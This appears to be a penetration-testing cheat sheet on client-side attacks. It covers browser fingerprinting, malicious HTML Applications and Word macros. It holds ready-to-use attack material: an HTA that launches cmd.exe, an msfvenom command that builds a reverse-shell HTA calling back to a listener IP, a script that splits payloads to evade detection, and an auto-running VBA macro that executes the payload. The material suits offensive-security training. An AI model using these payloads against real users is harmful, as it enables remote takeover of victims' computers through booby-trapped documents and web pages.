# Client Side Attacks

## Enumeration

* **Passive Enumeration:**
  * Identify the victim's browser.
* **Active Enumeration:**
  * **Social Engineering:**
    * Craft messages or scenarios to manipulate users into revealing sensitive information or performing actions.

## Leveraging HTML Apps

* **Tool:** [**fingerprintjs2**](https://github.com/LukasDrgon/fingerprintjs2)
  * A JavaScript library to uniquely identify a browser based on its features.
* **HTA Attack:**
  * Create an HTA (HTML Application) to execute malicious scripts.
    *   Example HTA file (`file.hta`):

        ```html
        <!DOCTYPE html>
        <html>
        <head>
            <script>
            var x='cmd.exe'
            new ActiveXObject('WScript.shell').Run(x);
            </script>
        </head>
        <body>
            <script> self.close() </script> 
        </body>
        </html>
        ```
    *   Copy the HTA file to a web server:

        ```bash
        sudo cp file.hta /var/www/html/file2.hta
        ```
    *   Generate an HTA payload with msfvenom:

        ```bash
        sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.114.134 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
        ```

## Exploiting Microsoft Office

* **Word Macro:**
  *   Split the payload to evade detection.

      ```python
      str="" # payload from msfvenom
      n=50
      for i in range(0,len(str),n):
          print "str = Str +" + '"' + str[i:i+n] + '"'
      ```
  *   Add the split payload to a Word Macro (`document.docm`).

      ```vba
      Sub AutoOpen()
          test1
      End Sub

      Sub Doc_Open()
          test1
      End Sub

      Sub test1()
          Dim Str As String
          ' Add the splitted payload here
          CreateObject("Wscript.shell").Run Str
      End Sub
      ```
* **Object Linking and Embedding (OLE):**
  * Create an evil batch file (`evil.bat`).
  * Create a link object in the Word document (`document.docm`).

#### Resources:

* [fingerprintjs2 GitHub Repository](https://github.com/LukasDrgon/fingerprintjs2)
* [Metasploit Framework (msfvenom)](https://www.metasploitunleashed.com/msfvenom/)
* [Microsoft VBA Programming](https://docs.microsoft.com/en-us/office/vba/api/overview/)
